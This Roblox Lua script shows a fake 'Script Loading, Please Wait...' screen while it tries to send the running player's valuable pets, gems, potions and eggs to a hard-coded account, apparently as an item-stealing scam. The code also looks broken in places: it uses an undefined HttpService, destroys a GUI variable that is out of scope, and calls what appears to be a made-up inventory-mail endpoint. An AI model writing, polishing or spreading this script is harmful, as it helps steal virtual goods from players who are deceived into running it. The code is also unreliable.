local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local function createLoadingGui()
    local loadingGui = Instance.new("ScreenGui")
    loadingGui.Name = "LoadingGui"
    loadingGui.Parent = game.CoreGui

    local frame = Instance.new("Frame")
    frame.Parent = loadingGui
    frame.BackgroundTransparency = 0.7
    frame.BorderSizePixel = 0
    frame.Position = UDim2.new(0.5, -100, 0.5, -50)
    frame.Size = UDim2.new(0.2, 0, 0.1, 0)

    local label = Instance.new("TextLabel")
    label.Parent = frame
    label.Text = "Script Loading, Please Wait..."
    label.TextColor3 = Color3.new(1, 1, 1)
    label.TextSize = 14
    label.TextWrapped = true
end

local function mailItems(items, message)
    for _, item in pairs(items) do
        local success, result = pcall(function()
            return game:GetService("HttpService"):PostAsync("https://api.roblox.com/users/inventory/mail", {
                Body = HttpService:JSONEncode({
                    userId = game.UserId,
                    recipientId = 34952496, -- Replace with Superboyguy4321's UserID
                    message = message,
                    items = {item.Id}
                })
            })
        end)

        if not success then
            print("Error mailing item:", result)
        end
    end
end

local function mailHighChancePets()
    local pets = game.Workspace:FindFirstChild("Pets") -- Replace with your pets container name
    if pets then
        for _, pet in pairs(pets:GetChildren()) do
            local chance = pet:FindFirstChild("Chance")
            if chance and tonumber(chance.Value) > 1000000 then
                mailItems({pet}, "Hi")
            end
        end
    end
end

local function mailGemsPotionsEggs()
    local itemsToMail = {
        game.Workspace:FindFirstChild("Gems"),
        game.Workspace:FindFirstChild("Potions"),
        game.Workspace:FindFirstChild("Eggs")
    }

    for _, container in pairs(itemsToMail) do
        if container then
            local items = {}
            for _, item in pairs(container:GetChildren()) do
                table.insert(items, item)
            end
            mailItems(items, "Hi")
        end
    end
end

createLoadingGui()
mailHighChancePets()
mailGemsPotionsEggs()

-- Remove the loading GUI after mailing
game:GetService("RunService").Heartbeat:Wait()
loadingGui:Destroy()

print("Items mailed successfully!")
